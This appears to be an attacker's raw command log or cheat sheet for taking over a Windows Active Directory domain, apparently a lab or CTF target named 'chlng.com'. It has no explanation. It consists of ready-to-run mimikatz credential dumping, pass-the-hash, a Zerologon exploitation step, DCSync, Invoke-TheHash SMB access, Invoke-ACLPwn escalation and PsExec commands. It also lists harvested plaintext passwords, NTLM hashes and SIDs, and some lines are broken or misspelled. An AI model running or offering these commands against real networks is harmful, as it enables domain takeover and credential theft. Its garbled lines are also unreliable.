cmd /c powershell C:\ProgramData\PsExec64.exe \\Chlng.com; > C:\ProgramData\admin.txt

HealthMailbox88fa07b4457a4de3bc3da6b5d4c5a1d9@CHLNG.com
vwbMP;W})y4L-#MkEsz]@BC=LIvB[P7XX[RWCfXUMNd[P6!]nrdM=@!icSt3MPE6@8VjEb7[gP3:g3*#ywg-9CeVHG2RZ[;tiVNrDtHZG;-:Qdbf4w*4M-&sOa{2NxKc

Administrator
60ba4fcadc466c7a033c178194c03df6

HealthMailbox88fa07b
ffc0139451b34fdb5f7ba33f0a75e086

CHLNG-WKS-1$
86fdb74721e95a00313dc72003155fc8

C:\\ProgramData\\mimikatz\\x64\\mimikatz.exe privilege::debug sekurlsa::logonpasswords "sekurlsa::tickets /export" TOKEN::List TOKEN::Elevate TOKEN::Whoami exit 

C:\\ProgramData\\mimikatz\\x64\\mimikatz.exe "sekurlsa::pth /user:Administrator /domain:chlng.com /ntlm:1429fb97d4b6482fa9284f1f0e31e841 /run:C:\\ProgramData\\script.bat" exit

C:\\ProgramData\\mimikatz\\x64\\mimikatz.exe "lsadump::postzerologon /target:10.0.0.100 /account:Administrator" exit

net use \\\\chlng.com\\C$ vwbMP;W})y4L-#MkEsz]^@BC=LIvB[P7XX[RWCfXUMNd[P6!]nrdM=@!icSt3MPE6^@8VjEb7[gP3:g3*#ywg-9CeVHG2RZ[;tiVNrDtHZG;-:Qdbf4w*4M-^&sOa{2NxKc /user:HealthMailbox88fa07b4457a4de3bc3da6b5d4c5a1d9 

cmd /c powershell Import-Module \'C:\\ProgramData\\Invoke-TheHash\\Invoke-TheHash-master\\Invoke-TheHash.ps1\'; Import-Module \'C:\\ProgramData\\Invoke-TheHash\\Invoke-TheHash-master\\Invoke-SMBClient.ps1\'; Invoke-SMBClient -Domain \'chlng.com\' -Username Administrator -Hash \'1429fb97d4b6482fa9284f1f0e31e841\' -Action List -Source \'\\\\CHLNG-PDC-01\\C$\' -verbose \^> C:\\ProgramData\\admin.txt

Exploiting CVE discovered in 2020

C:\\ProgramData\\mimikatz\\x64\\mimikatz.exe \"lsadump::dcsync /dc:10.0.0.100 /user:chong /authuser:HealthMailbox88fa07b /authdomain:chlng.com /authpassword:ccfc3277633ff0750583e5615b550ab6 /authntlm" exit 

C:\\ProgramData\\mimikatz\\x64\\mimikatz.exe "lsadump::dcsync /dc:10.0.0.100 /user:chong /authuser:Administrator /authdomain:chlng.com /authntlm" exit 

echo C:\\ProgramData\\mimikatz\\x64\\mimikatz.exe \^"lsadump::dcsync /dc:10.0.0.100 /user:chong /authuser:CHLNG-WKS-1$ /authdomain:chlng.com /authpassword:M%vdY3)7U[cllxOaD7xWe=rfruPnP^&^&(o07^px,AVci\^>9_tBh^"-SLt%6c;%dyhhjK2@ Qc4 5;5iv%6 9/cCP]+,;L,*%3]lwPvwSkW69MKcIx]7b:LP9KD= /authntlm\^" exit ^> C:\\ProgramData\\admin.txt

powershell $password = Get-Content C:\\ProgramData\\password.txt ; C:\\ProgramData\\Invoke-ACLPwn.ps1 -domain chlng.com -username chlng.com\\HealthMailbox88fa07b -password $password -SharpHoundLocation C:\\ProgramData\\SharpHound.exe -mimiKatzLocation C:\\ProgramData\\mimikatz\\x64\\mimikatz.exe -userAccountToPwn chong

powewrshell $username = \'HealthMailbox88fa07b\' ; $password = Get-Content C:\\ProgramData\\password.txt ; $securePassword = ConvertTo-SecureString $password -AsPlainText -Force ; 

C:\\ProgramData\\mimikatz\\x64\\mimikatz.exe "lsadump::dcsync /domain:chlng.com /user:chong /authntlm" exit

chong
S-1-5-21-2993726475-773441375-2775554650-1107

HealthMailbox88fa07b
S-1-5-21-2993726475-773441375-2775554650-1139